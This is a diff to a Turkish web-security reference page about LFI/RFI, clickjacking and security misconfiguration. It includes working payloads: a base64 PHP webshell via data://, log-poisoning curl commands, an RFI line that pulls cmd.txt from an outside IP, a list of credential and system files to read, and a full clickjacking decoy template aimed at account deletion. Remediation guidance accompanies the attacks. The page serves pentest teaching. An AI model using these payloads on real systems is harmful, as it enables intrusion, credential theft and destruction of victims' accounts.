+                  <pre style="margin-top:6px; background:rgba(0,0,0,0.3); padding:8px; border-radius:6px; color:#d6f4ff;">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+# veya
+php://input  (POST Body: &lt;?php system('id'); ?&gt;)</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Session Poisoning:</strong> Oturum çerezi veya profil verisi içine PHP kodu yazıp session dosyasını LFI ile çağırma:
+                  <pre style="margin-top:6px; background:rgba(0,0,0,0.3); padding:8px; border-radius:6px; color:#d6f4ff;">?file=/var/lib/php/sessions/sess_[SESSION_ID]&cmd=id</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>File Upload Noktaları:</strong> Profil resmi gibi zararsız görünen bir upload alanına PHP kodu gömüp, ardından bu dosyanın kaydedildiği yolu LFI ile include ederek çalıştırma.
+                </li>
+              </ul>
+            `
+          },
+          {
+            title: '6. Kritik Dosyalar Referans Listesi',
+            content: `
+              <div style="display:grid; grid-template-columns: repeat(2, 1fr); gap:12px; font-size:13px;">
+                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid var(--accent);">
+                  <strong style="color:#cbd5e1; display:block; margin-bottom:6px;">Linux Hedefleri</strong>
+                  <ul style="padding-left:18px; margin:0; color:var(--muted); line-height:1.6">
+                    <li><code>/etc/passwd</code> (Kullanıcı listesi)</li>
+                    <li><code>/etc/shadow</code> (Parola hash'leri - root yetkisi gerekir)</li>
+                    <li><code>/etc/hosts</code> & <code>/proc/net/arp</code> (İç ağ haritası)</li>
+                    <li><code>/proc/self/environ</code> (Ortam değişkenleri)</li>
+                    <li><code>/root/.ssh/id_rsa</code> (SSH private key)</li>
+                    <li><code>/root/.bash_history</code> (Komut geçmişi)</li>
+                    <li><code>/var/log/apache2/access.log</code> (Apache erişim logları)</li>
+                    <li><code>/var/log/nginx/access.log</code> (Nginx logları)</li>
+                  </ul>
+                </div>
+                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid var(--accent);">
+                  <strong style="color:#cbd5e1; display:block; margin-bottom:6px;">Windows Hedefleri</strong>
+                  <ul style="padding-left:18px; margin:0; color:var(--muted); line-height:1.6">
+                    <li><code>C:\\Windows\\win.ini</code> (Temel doğrulama dosyası)</li>
+                    <li><code>C:\\boot.ini</code> (Önyükleme yapılandırması)</li>
+                    <li><code>C:\\Windows\\System32\\drivers\\etc\\hosts</code> (Host kayıtları)</li>
+                    <li><code>C:\\inetpub\\logs\\LogFiles\\</code> (IIS logları)</li>
+                    <li><code>C:\\xampp\\apache\\logs\\access.log</code> (XAMPP logları)</li>
+                  </ul>
+                </div>
+              </div>
+            `
+          },
+          {
+            title: '7. PoC Örnekleri (Komut Satırı & İstekler)',
+            content: `
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Basit LFI:</strong> <code>GET /get.php?file=../../../../etc/passwd</code>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Log Poisoning &rarr; RCE Örnek Akış:</strong>
+                  <pre style="margin-top:6px; background:rgba(0,0,0,0.3); padding:8px; border-radius:6px; color:#d6f4ff;"># 1. Adım: User-Agent başlığı ile loga PHP kodu yaz (curl):
+curl -H "User-Agent: &lt;?php system(\$_GET['cmd']); ?&gt;" http://target.com/
 
-  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-    <b>Null Byte + Uzantı Filtresi Bypass:</b> <code>/image?filename=../../../../etc/passwd%00.jpg</code>
-    <ul style="padding-left: 20px; margin-top: 8px; font-size: 13px;">
-      <li>
-        <b><code>.jpg</code> kısmı:</b> Uygulama "sadece .jpg dosyalarını aç" diye bir filtre uyguluyor olabilir. Sona <code>.jpg</code> ekleyerek bu ilk kuralı (filtreyi) atlatırız.
-      </li>
-      <li>
-        <b><code>%00</code> (Null Byte) kısmı:</b> Bu, "metnin sonu" anlamına gelir. Sunucu, <code>...passwd%00.jpg</code> dosyasını açmaya çalıştığında <code>%00</code>'ı görür ve "Dosya adı burada bitti" der. <code>.jpg</code> kısmını yok sayar ve <code>.../etc/passwd</code> dosyasını açmaya çalışır.
-      </li>
-    </ul>
-  </li>
-</ul>
-        `
+# 2. Adım: Log dosyasını LFI ile include edip komut çalıştır:
+curl "http://target.com/index.php?file=/var/log/apache2/access.log&cmd=whoami"</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>RFI PoC:</strong> <code>http://target.com/index.php?file=http://10.10.145.212:8000/cmd.txt</code>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong>Flag/Veri Okuma:</strong> curl ile POST istekleri veya null-byte/double-encode varyasyonları denenerek kısıtlı alanlar okunabilir.
+                </li>
+              </ul>
+            `
           },
           {
-            title: 'Önemli Wrapper & Teknikler',
+            title: '8. Savunma ve Doğru Yapılandırma (Remediation)',
             content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">PHP wrappers: <code>php://input</code>, <code>data://text/plain,<?php ...?></code> ile bazı senaryolarda exploit mümkün.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Log poisoning adımı: access log’a payload gönder (User-Agent veya GET param) → LFI ile log include edilirse RCE elde edilir.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">File upload noktaları: upload sonrası path enjekte edilebilir; extension check bypass ile .php yüklenip include edilebilir.</li>
-          </ul>
-        `
-          },
-          {
-            title: 'Kritik Dosyalar',
-            content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Linux: <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/root/.ssh/id_rsa</code>, <code>/root/.bash_history</code>, <code>/proc/version</code>, webserver logları (<code>/var/log/apache2/access.log</code>).</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Windows: <code>C:\\boot.ini</code>, <code>C:\\Windows\\win.ini</code>, IIS log dosyaları.</li>
-          </ul>
-        `
-          },
-          {
-            title: 'PoC Örnekleri',
-            content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Basit LFI: <code>GET /get.php?file=../../../../etc/passwd</code></li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Log poisoning → RCE örnek akış: 1) User-Agent'a PHP kodu gönder (curl) 2) <code>?file=/var/log/apache2/access.log&c=whoami</code> ile include.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">RFI PoC (server izinliyse): <code>?file=http://10.10.145.212:8000/cmd.txt</code></li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Flag örnekleri: curl ile POST istekleri veya null-byte traversal denemeleri kullanılabilir.</li>
-          </ul>
-        `
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:10px">
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">1. Beyaz Liste (Allowlist) Doğrulaması:</strong>
+                  Kullanıcıdan dosya adı almak yerine yalnızca önceden tanımlanmış sabit bir liste (indeks eşlemesi) üzerinden dosya çağrılmalıdır:
+                  <pre style="background:rgba(0,0,0,0.3);padding:6px;border-radius:4px;margin-top:4px;color:#d6f4ff;font-family:monospace;font-size:12px;">$allowed_files = ['home.php', 'about.php', 'contact.php'];
+if (!in_array($_GET['page'], $allowed_files, true)) { die('Geçersiz sayfa'); }</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">2. Dizin Yolu Doğrulaması (Path Normalization):</strong>
+                  Dosya yolu okunmadan önce çözümlenmeli ve hedeflenen kök dizinin dışına çıkmadığı doğrulanmalıdır:
+                  <pre style="background:rgba(0,0,0,0.3);padding:6px;border-radius:4px;margin-top:4px;color:#d6f4ff;font-family:monospace;font-size:12px;">$path = realpath($base_dir . '/' . $_GET['file']);
+if ($path === false || strpos($path, $base_dir) !== 0) { die('Erişim reddedildi'); }</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">3. PHP Güvenlik Yönergeleri:</strong>
+                  Sunucu yapılandırmasında harici dosya dahil etme özellikleri kapatılmalıdır:
+                  <pre style="background:rgba(0,0,0,0.3);padding:6px;border-radius:4px;margin-top:4px;color:#d6f4ff;font-family:monospace;font-size:12px;">allow_url_fopen = Off
+allow_url_include = Off</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">4. En Az Yetki Prensibi:</strong>
+                  Web sunucusu kullanıcısının (örn: <code>www-data</code>) işletim sistemindeki dosya okuma izinleri sıkılaştırılmalı; sistem loglarına ve yapılandırma dizinlerine okuma erişimi kısıtlanmalıdır.
+                </li>
+              </ul>
+            `
           }
         ]
       },
@@ -8804,59 +8830,194 @@ DigitalOcean: http://169.254.169.254/metadata/v1.json</pre>
         }
       ]
     },
-
-      clickjacking: {
+clickjacking: {
         menuName: 'Clickjacking',
-        icon: 'icon-external-link',
+        icon: 'icon-bug',
         parent: 'vulnerabilities',
-        title: 'Clickjacking (UI Redressing) Zafiyeti',
-        description: 'Kullanıcının kritik bir işlemi, aldatıcı bir arayüz arkasına gizlenmiş görünmez bir iframe üzerinden gerçekleştirmesini sağlama tekniği.',
+        title: 'Clickjacking (UI Redressing) & Frame Spoofing',
+        description: 'Kullanıcının kimliği doğrulanmış oturumunu kullanarak, görünmez veya aldatıcı bir iframe katmanı üzerinden tek tıkla geri dönüşü olmayan hassas eylemleri tetikleme zafiyeti.',
         sections: [
           {
-            title: 'Özet Bilgi ve Kritik Etki',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Clickjacking, oturum yönetimi zafiyetine (Broken Session Management) dayanır. Eğer kurban oturum açmışsa, iframe içindeki kritik butona tıklatılabilir.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Kritik Etkiler:</strong> Hesap Silme, Şifre Değiştirme, Para Transferi Onayı (CSRF token kontrolü atlanmışsa), Admin eylemlerinin tetiklenmesi.</li>
-            </ul>`
+            title: '1. Clickjacking Nedir? (Çalışma Mantığı & Risk Seviyesi)',
+            content: `
+              <p style="color:var(--muted);font-size:14px;margin-bottom:12px;">
+                <b>Clickjacking (UI Redressing):</b> Saldırganın, hedef web uygulamasını şeffaf (opaklığı sıfıra yakın) bir <code>&lt;iframe&gt;</code> içine gömerek kurbanın göreceği aldatıcı bir arayüzün (örn. "Hediye Kazandın!" butonu) altına yerleştirmesidir.
+              </p>
+              <p style="color:var(--muted);font-size:14px;margin-bottom:12px;">
+                Kullanıcı sahte butona tıkladığını sanırken, tarayıcı arka plandaki görünmez iframe içindeki hassas butona (örn. "Hesabımı Sil", "API Anahtarı Oluştur") tıklama olayını iletir.
+              </p>
+              <div class="tool-io-grid">
+                <div class="card" style="margin-bottom:0; border: 1px solid var(--border);">
+                  <h4 style="font-size:13px; color:#cbd5e1;">CSRF Token Korumasını Aşma Özelliği</h4>
+                  <p class="small" style="margin:0;">Clickjacking, klasik CSRF korumalarını (Anti-CSRF tokenları) doğrudan aşar. Çünkü istek üçüncü parti bir script tarafından sahtelenmez; bizzat meşru sayfa içindeki buton kurbanın kendi tarayıcısı ve tıklamasıyla tetiklenir.</p>
+                </div>
+                <div class="card" style="margin-bottom:0; border: 1px solid var(--border);">
+                  <h4 style="font-size:13px; color:#cbd5e1;">SameSite Cookie Engeli (Modern Kısıt)</h4>
+                  <p class="small" style="margin:0;">Hedef sitenin oturum çerezi <code>SameSite=Strict</code> veya <code>SameSite=Lax</code> ise, üçüncü taraf sitedeki iframe içine gömüldüğünde çerezler gönderilmeyebilir. Bu durumda kurban iframe içinde oturumsuz görüneceğinden saldırı boşa düşer. En yüksek etki <code>SameSite=None</code> çerezlerinde veya Lax istisnalarında alınır.</p>
+                </div>
+              </div>
+            `
           },
           {
-            title: 'Hızlı Tespit ve Savunma Kontrolü',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 1: Kritik Hedefleri Bul:</strong> Şifre resetleme, e-posta değiştirme, ödeme onayı gibi tek tıkla geri dönüşü olmayan işlemlere odaklan.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 2: iframe Testi Yap:</strong> Kendi local HTML dosyanızda hedef URL'i bir iframe içine gömün ve tarayıcıda açın. Başarılı yükleniyorsa zafiyet adayıdır.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 3: Header Kontrolü (Burp/DevTools):</strong> Sunucu yanıtında bu başlıkları ara:
-                <ul>
-                    <li><code>X-Frame-Options: DENY</code> (En güçlü engelleme)</li>
-                    <li><code>X-Frame-Options: SAMEORIGIN</code> (Aynı domain iframe'e izin verir)</li>
-                    <li><code>Content-Security-Policy: frame-ancestors 'none'</code> (En modern ve güçlü engelleme)</li>
-                </ul></li>
-            </ul>`
+            title: '2. Bug Bounty Kabul Kriterleri (Hangi Durumlar Kabul Edilir?)',
+            content: `
+              <p class="small" style="margin-bottom:12px;">Programlar sadece sitenin iframe'e alınabilmesini (Information/P5) zafiyet saymaz. Raporun ödül alabilmesi için <b>somut bir etkinin (state-changing impact)</b> kanıtlanması şarttır:</p>
+              <div style="display:grid; grid-template-columns: repeat(2, 1fr); gap:12px; font-size:13px;">
+                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid var(--accent);">
+                  <strong style="color:#cbd5e1; display:block; margin-bottom:4px;">✅ Geçerli & Kabul Edilen Senaryolar</strong>
+                  <ul style="padding-left:18px; margin:0; color:var(--muted); line-height:1.6">
+                    <li>Tek tıkla hesap silme veya dondurma</li>
+                    <li>2FA / MFA korumasını devre dışı bırakma butonu</li>
+                    <li>OAuth izin ekranında "Yetkilendir / Authorize" butonuna basılması</li>
+                    <li>Yeni API anahtarı üretme veya gizli veriyi dışa aktarma (Export)</li>
+                    <li>E-posta yönlendirme veya tekil güvenlik ayarlarını değiştirme</li>
+                  </ul>
+                </div>
+                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid var(--border);">
+                  <strong style="color:#cbd5e1; display:block; margin-bottom:4px;">❌ Genellikle Reddedilen (Out of Scope) Durumlar</strong>
+                  <ul style="padding-left:18px; margin:0; color:var(--muted); line-height:1.6">
+                    <li>Statik içeriklerin iframe'e gömülebilmesi (Hakkımızda, Blog)</li>
+                    <li>Kullanıcının form doldurmasını veya karmaşık metin girmesini gerektiren alanlar</li>
+                    <li>Açıkça parola veya SMS onay kodu tekrarı isteyen işlemler</li>
+                    <li>Kullanıcı oturumu gerektirmeyen herkese açık sayfalar</li>
+                  </ul>
+                </div>
+              </div>
+            `
           },
           {
-            title: 'Bypass Teknikleri',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>SAMEORIGIN Atlatma:</strong> Eğer <code>X-Frame-Options: SAMEORIGIN</code> varsa ve subdomain'lerde XSS veya Open Redirect varsa bu zafiyetleri zincirleyerek atlatmayı deneyin.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Null Byte/Encoding Bypass:</strong> Nadiren bazı eski sunucular, header değerine URL encode edilmiş karakterler (<code>%00</code>) eklenerek header'ın geçerliliğini yitirmesine neden olabilir.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Frame Buster Atlatma:</strong> Sayfa kendisini frame'den çıkarmaya çalışan JS koduna sahipse (Frame Buster), <code>sandbox</code> özniteliği veya JS'yi geçersiz kılan tarayıcı tricklerini araştırın.</li>
-            </ul>`
+            title: '3. Hızlı Tespit ve Savunma Başlıkları Kontrolü',
+            content: `
+              <p class="small" style="margin-bottom:12px;">Burp Suite veya tarayıcı konsolunda gelen HTTP yanıt başlıklarını incele:</p>
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:10px">
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">1. X-Frame-Options (XFO)</strong>
+                  <div class="small" style="line-height:1.6;">
+                    &bull; <code>DENY</code>: Sayfa hiçbir şartta iframe içinde açılamaz. (En güvenli)<br>
+                    &bull; <code>SAMEORIGIN</code>: Sayfa yalnızca kendi domainindeki iframe'lerde açılabilir.<br>
+                    <b>Eksikse:</b> Başlık hiç gönderilmiyorsa sayfa doğrudan iframe'e alınabilir.
+                  </div>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">2. Content-Security-Policy (CSP: frame-ancestors)</strong>
+                  <div class="small" style="line-height:1.6;">
+                    X-Frame-Options'ın yerini alan modern W3C standardıdır. Tarayıcı her iki başlığı da görürse <b>CSP'yi öncelikli kabul eder</b>.<br>
+                    &bull; <code>Content-Security-Policy: frame-ancestors 'none';</code> (Tamamen engeller)<br>
+                    &bull; <code>Content-Security-Policy: frame-ancestors 'self';</code> (Sadece aynı origin izinli)<br>
+                    &bull; <code>Content-Security-Policy: frame-ancestors https://trusted.com;</code> (Beyaz liste)
+                  </div>
+                </li>
+              </ul>
+            `
           },
           {
-            title: 'PoC Örnekleri (Basit HTML)',
-            content: `<pre>
+            title: '4. İleri Düzey Bypass Teknikleri',
+            content: `
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:6px;">Frame Buster / Frame Breaker Kırma (HTML5 Sandbox)</strong>
+                  <p class="small" style="margin-bottom:6px;">Eski siteler XFO yerine JavaScript tabanlı kontrol kullanır: <code>if (top != self) { top.location = self.location; }</code>. Bu kod sayfanın iframe'den fırlayıp ana sekmede açılmasını sağlar.</p>
+                  <p class="small" style="margin-bottom:6px;"><b>Bypass:</b> Saldırgan iframe'e HTML5 <code>sandbox</code> özniteliğini ekler ancak <code>allow-top-navigation</code> iznini <b>vermez</b>:</p>
+                  <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;font-size:12px;color:#d6f4ff;white-space:pre-wrap;">&lt;iframe src="https://target.com/settings" sandbox="allow-forms allow-scripts"&gt;&lt;/iframe&gt;</pre>
+                  <span class="small" style="color:var(--muted); margin-top:4px; display:block;">Tarayıcı form doldurmaya ve script çalıştırmaya izin verirken, frame buster kodunun sayfayı üst pencereye yönlendirmesini engeller.</span>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:6px;">SAMEORIGIN Baypass (XSS & Open Redirect Zinciri)</strong>
+                  <p class="small" style="margin-bottom:6px;">Hedef sitede <code>X-Frame-Options: SAMEORIGIN</code> tanımlıysa ancak aynı domain altındaki herhangi bir alt sayfada veya subdomainde Reflected XSS / Open Redirect varsa:</p>
+                  <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;font-size:12px;color:#d6f4ff;white-space:pre-wrap;">&lt;iframe src="https://target.com/open-redirect?url=https://target.com/account/delete"&gt;&lt;/iframe&gt;</pre>
+                  <span class="small" style="color:var(--muted); margin-top:4px; display:block;">İstek hedef siteden hedef siteye yönlendiği için tarayıcı SAMEORIGIN kuralını ihlal edilmemiş sayabilir.</span>
+                </li>
+              </ul>
+            `
+          },
+          {
+            title: '5. Profesyonel PoC & Exploit Şablonu (Piksel Hizalama)',
+            content: `
+              <p class="small" style="margin-bottom:10px;">Aşağıdaki HTML şablonu; hedef iframe'i saydamlaştırıp kurbanın tıklayacağı sahte butonun arkasına milimetrik olarak oturtmak için kullanılır:</p>
+              <div class="card" style="border-left: 2px solid var(--accent); margin-bottom:10px;">
+                <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;font-family:monospace;font-size:12px;color:#d6f4ff;">&lt;!DOCTYPE html&gt;
 &lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Ödül Talep Sayfası&lt;/title&gt;
+    &lt;style&gt;
+        /* Kurbanın göreceği sahte dış katman */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: sans-serif;
+        }
+        .decoy-container {
+            position: absolute;
+            top: 150px;
+            left: 200px;
+            z-index: 1; /* Alt katmanda görsel içerik */
+        }
+        .decoy-btn {
+            background: #2563eb;
+            color: #fff;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        /* Hedeflenen görünmez iframe katmanı */
+        .target-iframe {
+            position: absolute;
+            width: 800px;
+            height: 600px;
+            /* Test ederken koordinatları görmek için opacity'yi 0.5 yapın */
+            /* Gerçek exploit için: opacity: 0.0001; veya opacity: 0; */
+            opacity: 0.2;
+            z-index: 2; /* Üst katmanda tıklamayı yakalar */
+            /* Koordinatları hedef butonun tam decoy-btn üzerine geleceği şekilde kaydırın: */
+            top: 100px;
+            left: 140px;
+            border: 1px solid red;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
 &lt;body&gt;
-&lt;!-- Hedeflenen sayfa, saydam ve üst katmanın altına yerleştirilir --&gt;
-&lt;iframe src="https://hedefsite.com/action?csrf=xyz" 
-        style="position:absolute; left:20px; top:100px; 
-               width:400px; height:200px; 
-               opacity:0.0001; z-index:100;"&gt;
-&lt;/iframe&gt;
+    &lt;div class="decoy-container"&gt;
+        &lt;h3&gt;Tebrikler! 500 TL Kupon Kazandınız!&lt;/h3&gt;
+        &lt;button class="decoy-btn"&gt;Kuponu Hemen Tanımla&lt;/button&gt;
+    &lt;/div&gt;
 
-&lt;!-- Kurbanın göreceği aldatıcı arayüz --&gt;
-&lt;button style="position:absolute; left:20px; top:100px; z-index:1;"&gt;ÜCRETSİZ PARA KAZAN&lt;/button&gt;
+    &lt;!-- Hedef hassas endpoint --&gt;
+    &lt;iframe class="target-iframe" src="https://target.com/account/delete" scrolling="no"&gt;&lt;/iframe&gt;
 &lt;/body&gt;
 &lt;/html&gt;</pre>
-<p class="small">Hedeflenen butonun koordinatlarını, üstteki aldatıcı butonun tam üzerine gelecek şekilde ayarlayın (Chrome DevTools ile koordinatları bulun).</p>`
+              </div>
+              <div class="small" style="color:var(--muted); line-height:1.6;">
+                <b>Koordinat Ayarlama İpucu:</b> Chrome DevTools'u açın, <code>.target-iframe</code> stilindeki <code>opacity</code> değerini <code>0.4</code> yapın. CSS'teki <code>top</code> ve <code>left</code> değerlerini piksel piksel değiştirerek hedefteki butonun decoy butonun tam üstüne oturmasını sağlayın. Kanıt videosunu (PoC) kaydederken opacity'yi <code>0.0001</code>'e çekin.
+              </div>
+            `
+          },
+          {
+            title: '6. Savunma ve Doğru Yapılandırma (Remediation)',
+            content: `
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:10px">
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">1. CSP frame-ancestors Direktifi (Önerilen Savunma):</strong>
+                  Web sunucusuna veya reverse proxy'ye modern CSP başlığını ekleyin. Bu direktif sayfanın hiçbir harici iframe'e gömülemeyeceğini garanti eder:
+                  <pre style="background:rgba(0,0,0,0.3);padding:6px;border-radius:4px;margin-top:4px;color:#d6f4ff;font-family:monospace;font-size:12px;">Content-Security-Policy: frame-ancestors 'none';</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">2. X-Frame-Options Başlığı (Geriye Dönük Uyumluluk):</strong>
+                  Eski tarayıcıları desteklemek için XFO başlığını DENY olarak ayarlayın:
+                  <pre style="background:rgba(0,0,0,0.3);padding:6px;border-radius:4px;margin-top:4px;color:#d6f4ff;font-family:monospace;font-size:12px;">X-Frame-Options: DENY</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">3. SameSite Çerez Yapılandırması:</strong>
+                  Oturum çerezlerine <code>SameSite=Lax</code> veya <code>SameSite=Strict</code> bayrağı ekleyin. Böylece harici bir iframe içinden yapılan isteklere oturum çerezleri dahil edilmez.
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">4. Kritik Eylemlerde Yeniden Doğrulama (Re-Authentication):</strong>
+                  Hesap silme, e-posta değiştirme veya para transferi gibi kritik işlemlerde kullanıcıdan mevcut parolasını, 2FA kodunu veya captcha doğrulamasını talep edin.
+                </li>
+              </ul>
+            `
           }
         ]
       },
@@ -9042,21 +9203,78 @@ DigitalOcean: http://169.254.169.254/metadata/v1.json</pre>
         title: "Security Misconfiguration (Güvenlik Yapılandırma Hatası)",
         description: "Sunucu, dosya, HTTP başlıkları (CORS, Cookies) ve varsayılan ayarlar gibi bileşenlerin güvensiz yapılandırılmasını test etme metodolojisi.",
         sections: [
-          {
-            "title": "Genel Bakış ve Kapsamı",
-            "content": `<ul style='list-style:none;padding:0;margin:0;display:grid;gap:8px'>
-        <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
-          Güvenlik Yanlış Yapılandırması, bir sistemin güvenlik duruşunu zayıflatan kasıtsız hatalar veya ihmallerdir. Bu, OWASP Top 10'da en sık görülen zafiyetlerden biridir çünkü modern uygulamalar çok katmanlı ve karmaşıktır.
-        </li>
-        <li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'>
-          <strong>Test Alanları:</strong>
-          <ul style='padding-left: 20px; margin-top: 8px;'>
-            <li><strong>Sunucu & Dosya Sistemi:</strong> <code>/.git</code>, <code>/.env</code> gibi sızan dosyalar, gereksiz HTTP metotları (<code>PUT</code>), detaylı hata mesajları.</li>
-            <li><strong>HTTP Başlıkları (Headers):</strong> Güvensiz CORS (<code>Origin</code>) yapılandırması, eksik <code>Set-Cookie</code> bayrakları (<code>HttpOnly</code>), eksik <code>Referrer-Policy</code>.</li>
-            <li><strong>Varsayılan Ayarlar:</strong> Cihaz veya yazılımların 'admin:admin', 'root:toor' gibi varsayılan parolalarla bırakılması.</li>
-          </ul>
-        </li>
-      </ul>`
+{
+            "title": "1. Genel Bakış, Kök Nedenler ve Mimari Kapsam",
+            "content": `
+              <p class="small" style="margin-bottom:14px; line-height:1.7;">
+                <b>Security Misconfiguration (OWASP A05):</b> Güvenli bir uygulama çatısı ve altyapı bileşenleri kullanılsa dahi; varsayılan ayarların değiştirilmemesi, gereksiz servis/metotların açık bırakılması, hata ayıklama (debug) çıktılarının ifşası veya katmanlar arası güvenlik politikalarının (CORS, Headers, IAM) gevşek yapılandırılması sonucu ortaya çıkan zafiyet sınıfıdır.
+              </p>
+
+              <div class="tool-io-grid" style="margin-bottom:14px;">
+                <div class="card" style="margin-bottom:0; border:1px solid rgba(139,92,246,0.3);">
+                  <h4 style="font-size:13px; color:var(--accent); margin:0 0 6px 0;">Neden En Yaygın Zafiyet?</h4>
+                  <p class="small" style="margin:0; line-height:1.6;">
+                    Geliştirme hızını artırmak için kullanılan "Ease of Use" (kullanım kolaylığı) refleksidir. Çoğu framework, konteyner ve bulut servisi; yerel geliştirmede takılma yaşanmaması için en esnek (ve en güvensiz) varsayılanlarla gelir. Canlıya (production) geçişte hardening adımları unutulduğunda açık kapı kalır.
+                  </p>
+                </div>
+                <div class="card" style="margin-bottom:0; border:1px solid rgba(6,182,212,0.3);">
